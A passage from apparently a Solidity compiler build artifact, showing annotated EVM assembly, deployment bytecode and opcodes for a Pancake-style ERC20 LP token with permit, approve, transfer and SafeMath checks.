swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n      pop\n      pop\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_78\n      jumpi\n      pop\n        /* \"src/ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"src/ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_78:\n        /* \"src/ERC20.sol\":4259:4391  require(... */\n      tag_79\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_79:\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_80\n        /* \"src/ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"src/ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"src/ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"src/ERC20.sol\":4401:4409  _approve */\n      tag_66\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_80:\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_63:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_66:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_70:\n        /* \"src/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_72:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_85\n      swap1\n        /* \"src/ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_70\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_85:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_86\n      swap1\n        /* \"src/ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_87\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_86:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_87:\n        /* \"src/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n\n    auxdata: 0xa265627a7a72315820f67d2fcb41c2924b09964a6438469181dd9dcbf870211c842940f1534ae0dced64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405146908060526109b7823960408051918290036052018220828201825260078352664b4243204c507360c81b6020938401528151808301835260018152603160f81b908401528151808401919091527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe818301527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606082015260808101949094523060a0808601919091528151808603909101815260c090940190528251920191909120600455506108cc806100eb6000396000f3fe608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a72315820f67d2fcb41c2924b09964a6438469181dd9dcbf870211c842940f1534ae0dced64736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x9B7 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP4 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP4 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP4 ADD DUP4 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP2 DUP4 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP7 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP5 ADD SWAP1 MSTORE DUP3 MLOAD SWAP3 ADD SWAP2 SWAP1 SWAP2 KECCAK256 PUSH1 0x4 SSTORE POP PUSH2 0x8CC DUP1 PUSH2 0xEB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 